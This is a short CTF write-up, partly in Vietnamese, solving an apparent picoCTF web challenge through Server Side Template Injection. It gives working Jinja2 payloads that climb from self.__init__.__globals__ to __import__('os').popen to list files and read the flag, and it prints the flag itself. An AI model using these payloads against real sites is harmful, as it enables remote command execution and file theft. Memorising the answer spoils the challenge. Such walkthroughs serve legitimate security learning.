## 🕵️‍♂️ Challenge:
### I made a cool website where you can announce whatever you want! Try it out!  
Additional details will be available after launching your challenge instance.  
### Hint:
1. Server Side Template Injection  
## 📝 Solution:

<img width="807" height="448" alt="image" src="https://github.com/user-attachments/assets/ebc8d72c-bf70-4f48-9eb9-b0f6b7566839" />

Đề cho 1 trang web khi người dùng nhập vào, nó sẽ đọc và in ra chuỗi vừa nhập.  

Vì đề gợi ý về Server Side Template Injection, vậy thử nhập {{7*7}} xem sao:  

<img width="1499" height="611" alt="image" src="https://github.com/user-attachments/assets/7a57d0ed-330e-4c6d-a40f-3d1e1576cac4" />

Nó in ra 49, vậy đúng là trang web có lỗ hỏng SSTI, bây giờ hãy khai thác nó.  

Thử nhập chuỗi sau để xác định xem trong context render có object nào cho phép leo lên **__globals__** hoặc truy cập module như os/sys hay không.:
```
{{ self.__init__.__globals__ }}
```

<img width="1912" height="988" alt="image" src="https://github.com/user-attachments/assets/0478bd0f-554e-4071-85eb-0d82c7eec6f7" />

Kết quả cho thấy có khả năng truy cập vào các thành phần bên trong của Python, bao gồm __builtins__. Từ đây, chúng ta có thể gọi các hàm nguy hiểm như __import__.  
Khi đã có hàm _import_, ta có thể import module OS để thực thi các lệnh hệ thống, nhập chuỗi sau để liệt kê các thành phần:  
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}
```

<img width="1733" height="660" alt="image" src="https://github.com/user-attachments/assets/919ff1e1-fba2-4a7a-bb62-8d6d2469299c" />

Vậy là có file `flag`, tiến hành đọc nó:  
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```

<img width="1919" height="661" alt="image" src="https://github.com/user-attachments/assets/de875304-7c6e-4783-9b8b-ad65acfcc712" />


> 🎯 Flag: **`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}`**
